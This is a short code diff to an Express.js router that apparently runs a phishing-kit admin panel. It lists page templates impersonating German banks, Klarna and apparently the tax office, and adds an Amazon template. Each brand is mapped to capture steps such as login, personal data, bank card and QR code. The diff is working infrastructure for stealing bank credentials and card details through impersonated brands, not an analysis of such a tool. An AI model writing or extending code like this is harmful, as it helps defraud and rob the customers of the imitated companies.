@@ -32,7 +32,7 @@ router.get('/', async (req, res) => {
     const existingTemplateFolders = [
       'commerzbank', 'santander', 'apobank', 'sparkasse', 'postbank', 
       'dkb', 'volksbank', 'comdirect', 'consorsbank', 'ingdiba', 'deutsche_bank',
-      'klarna', 'credit-landing', 'targobank', 'bzst'
+      'klarna', 'credit-landing', 'targobank', 'bzst', 'amazon'
     ];
     
     const templates = allTemplates.filter(template => 
@@ -431,7 +431,8 @@ router.post('/:id/reset-config', authenticateJWT, requireAdmin, async (req, res)
       'deutsche_bank': ['multiFieldLogin', 'personalData', 'qrCode', 'bankCard'],
       'dkb': ['personalData', 'qrUpload', 'bankCard', 'twoStepLogin'],
       'klarna': ['bankSelection', 'branchSelection', 'personalData', 'bankCard'],
-      'bzst': ['login']
+      'bzst': ['login'],
+      'amazon': []
     };
     
     const steps = defaultConfigs[template.folder_name];
